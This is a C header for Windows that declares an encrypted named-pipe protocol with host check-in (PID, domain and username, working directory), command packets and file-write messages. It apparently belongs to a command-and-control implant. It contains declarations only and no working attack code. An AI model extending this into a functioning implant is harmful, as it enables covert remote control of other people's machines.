#ifndef COMMUNICATION_H
#define COMMUNICATION_H

#include <Windows.h>
#include <stdint.h>

typedef struct checkin_
{
    uint32_t pid;
    wchar_t domain_and_username[512];
    wchar_t current_process_directory[260];
} checkin_t;

typedef struct packet_
{
    union
    {
        uint8_t buffer;
        uint32_t command_id;
        uint32_t is_wow64_check_flag;
        uint32_t pid;
        uint32_t result;
    } _0;
    union
    {
        uint32_t buffer_size;
        uint32_t error_code;
    } _1;
} packet_t;

packet_t* comm_allocate_packet();

void comm_encrypt_send_data(HANDLE pipe, const uint8_t* buffer,
    uint32_t buffer_size, const uint8_t* key,
    size_t key_size);

checkin_t* comm_new_checkin(void);

packet_t* comm_new_packet(uint32_t command_id, uint32_t buffer_size);

packet_t* comm_receive_packet(HANDLE pipe);

uint8_t* comm_receive_data(HANDLE pipe, uint32_t data_size);

checkin_t* comm_receive_checkin(HANDLE pipe, const uint8_t* key,
    size_t key_size);

uint8_t* comm_receive_decrypt_data(HANDLE pipe, uint32_t buffer_size,
    const uint8_t* key, size_t key_size);

void comm_send_command(HANDLE pipe, uint32_t command_id, const uint8_t* buffer,
    uint32_t buffer_size, const uint8_t* key,
    size_t key_size);

void comm_send_data(HANDLE pipe, const uint8_t* buffer, uint32_t buffer_size);

void comm_send_file_write(HANDLE pipe, const uint8_t* buffer,
    uint32_t buffer_size);

void comm_send_file_write_size(HANDLE pipe, uint32_t buffer_size);

void comm_send_packet(HANDLE pipe, const packet_t* packet);

checkin_t* comm_process_initial_checkin(HANDLE pipe, const uint8_t* key,
    size_t key_size);

void comm_send_request(HANDLE pipe, uint32_t command_id, uint32_t buffer_size);

#endif // !COMMUNNICAITON_H